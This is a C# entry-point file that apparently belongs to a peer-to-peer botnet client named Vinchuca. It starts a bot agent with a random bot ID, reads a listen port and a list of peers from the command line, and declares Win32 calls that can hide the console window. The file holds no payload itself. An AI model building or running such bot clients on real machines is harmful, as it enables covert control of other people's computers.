using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;
using Vinchuca.Network;
using Vinchuca.Network.Protocol.Peers;

namespace Vinchuca
{
    public class EntryPoint
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SwHide = 0;
        const int SwShow = 5;

        private static Agent agent;

        public static void Main(string[] args)
        {
            var hCmdWindow = GetConsoleWindow();
            ShowWindow(hCmdWindow, SwShow);

            var idbuf = new byte[16];
            new Random().NextBytes(idbuf);

            var id = new BotIdentifier(idbuf);
            var listenPort = 33333;
            var peers = new List<PeerInfo>();

            foreach (var arg in args)
            {
                var v = arg.Substring(1);
                switch (arg[0])
                {
                    case 'p':
                        int.TryParse(v, out listenPort);
                        break;
                    case 'c':
                        foreach (var peerInfo in v.Split(new[]{';'}))
                        {
                            peers.Add(PeerInfo.Parse(peerInfo));
                        }
                        break;
                    case 'i':
                        id = BotIdentifier.Parse(v);
                        break;
                }
            }
            agent = new Agent(listenPort, id);
            agent.Run();
            agent.Bootstrap(peers);

            new ManualResetEvent(false).WaitOne();
        }
    }
}